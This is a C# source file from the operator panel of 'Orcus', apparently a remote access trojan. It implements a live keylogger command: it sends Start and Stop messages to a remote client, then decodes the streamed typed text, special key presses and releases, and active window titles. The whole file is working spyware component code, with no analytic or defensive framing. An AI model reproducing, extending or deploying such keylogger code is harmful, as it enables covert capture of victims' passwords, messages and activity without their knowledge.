using System;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.Keylogger;
using Orcus.Shared.Commands.LiveKeylogger;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.LiveKeylogger
{
    [DescribeCommandByEnum(typeof (LiveKeyloggerCommunication))]
    public class LiveKeyloggerCommand : Command
    {
        public event EventHandler<string> StringDown;
        public event EventHandler<KeyLogEntry> KeyDown;
        public event EventHandler<KeyLogEntry> KeyUp;
        public event EventHandler<string> WindowChanged;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((LiveKeyloggerCommunication) parameter[0])
            {
                case LiveKeyloggerCommunication.StringDown:
                    StringDown?.Invoke(this, Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1));
                    break;
                case LiveKeyloggerCommunication.SpecialKeyDown:
                    KeyDown?.Invoke(this,
                        new Serializer(new[] {typeof (KeyLogEntry), typeof (SpecialKey), typeof (StandardKey)})
                            .Deserialize<KeyLogEntry>(parameter, 1));
                    break;
                case LiveKeyloggerCommunication.SpecialKeyUp:
                    KeyUp?.Invoke(this,
                        new Serializer(new[] {typeof (KeyLogEntry), typeof (SpecialKey), typeof (StandardKey)})
                            .Deserialize<KeyLogEntry>(parameter, 1));
                    break;
                case LiveKeyloggerCommunication.WindowChanged:
                    WindowChanged?.Invoke(this, Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1));
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void Start()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) LiveKeyloggerCommunication.Start});
            LogService.Send((string) Application.Current.Resources["StartLiveKeylogger"]);
        }

        public void Stop()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) LiveKeyloggerCommunication.Stop});
            LogService.Send((string) Application.Current.Resources["StopLiveKeylogger"]);
        }

        protected override uint GetId()
        {
            return 24;
        }
    }
}